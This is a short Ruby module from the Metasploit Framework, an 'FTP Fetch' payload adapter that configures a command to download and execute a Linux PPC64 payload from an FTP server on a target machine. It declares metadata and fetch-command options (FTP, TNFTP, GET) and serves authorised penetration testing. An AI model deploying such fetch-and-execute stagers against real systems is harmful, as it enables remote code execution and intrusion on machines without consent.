##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter::Fetch::FTP
  include Msf::Payload::Adapter::Fetch::LinuxOptions

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FTP Fetch',
        'Description' => 'Fetch and execute an PPC64 payload from an FTP server.',
        'Author' => ['Brendan Watters', 'Spencer McIntyre'],
        'Platform' => 'linux',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_PPC64,
        'AdaptedPlatform' => 'linux'
      )
    )
    deregister_options('FETCH_COMMAND')
    register_options(
      [
        Msf::OptEnum.new('FETCH_COMMAND', [true, 'Command to fetch payload', 'FTP', %w[FTP TNFTP GET]])
      ]
    )
  end
end
